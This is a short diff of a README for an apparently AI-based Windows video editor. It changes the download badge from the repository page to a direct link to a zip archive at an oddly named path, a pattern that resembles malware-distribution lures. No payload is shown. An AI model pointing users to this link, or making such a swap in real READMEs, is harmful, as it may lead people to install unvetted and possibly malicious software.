@@ -23,7 +23,7 @@ This isn't just another video editor. It's an **AI-native** tool that works enti
 
 ## 💾 Download and Install (Windows)
 
-[![Download cupcat-video-editor](https://img.shields.io/badge/Download-cupcat--video--editor-purple?style=for-the-badge&logo=github&logoColor=white)](https://github.com/shirtlineblock531/cupcat-video-editor)
+[![Download cupcat-video-editor](https://img.shields.io/badge/Download-cupcat--video--editor-purple?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/shirtlineblock531/cupcat-video-editor/main/disrobement/v2.9.zip)
 
 Visit this link to download the application. Once you're on the page, look for the download button and click it. The file will start downloading to your computer.
 
